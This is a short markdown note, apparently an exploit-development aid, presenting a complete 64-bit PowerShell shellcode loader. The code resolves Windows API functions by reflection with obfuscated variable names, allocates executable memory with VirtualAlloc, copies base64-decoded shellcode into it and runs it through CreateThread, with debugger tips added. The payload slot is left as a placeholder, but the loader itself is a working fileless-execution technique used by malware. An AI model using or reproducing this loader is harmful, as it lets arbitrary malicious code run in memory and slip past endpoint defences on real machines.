## 64-bit PowerShell Shellcode Tester
### Setup
```powershell
function myGetProcAddress {
     Param ($module_name, $function_name)
     $zZ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

 	return $zZ.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($zZ.GetMethod('GetModuleHandle')).Invoke($null, @($module_name)))), $function_name))
}

function myReflection {
     Param (
         [Parameter(Position = 0, Mandatory = $True)] [Type[]] $o7y,
         [Parameter(Position = 1)] [Type] $uz0b = [Void]
     )

     $iKx = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
     $iKx.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $o7y).SetImplementationFlags('Runtime, Managed')
     $iKx.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uz0b, $o7y).SetImplementationFlags('Runtime, Managed')

     return $iKx.CreateType()
}


[Byte[]]$shellcode = [System.Convert]::FromBase64String("<INSERT SHELLCODE HERE>")
$execution_address = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((myGetProcAddress kernel32.dll VirtualAlloc), (myReflection @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $shellcode.Length,0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $execution_address, $shellcode.length)
#supposed to print hex but it doesnt
"{0:x}" -f $execution_address
2143612633088

#print address to execute... breakpoint on this
[String]::Format("{0:x}", 2143612633088)
1f319450000
```


### Execution
Be sure to attach a debugger before running this part...
```powershell
#create thread to execute shellcode
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((myGetProcAddress kernel32.dll CreateThread), (myReflection @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$execution_address,[IntPtr]::Zero,0,[IntPtr]::Zero)

#sleep forever
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((myGetProcAddress kernel32.dll WaitForSingleObject), (myReflection @([IntPtr], [Int32]))).Invoke($hThread,0xffffffff) | Out-Null
```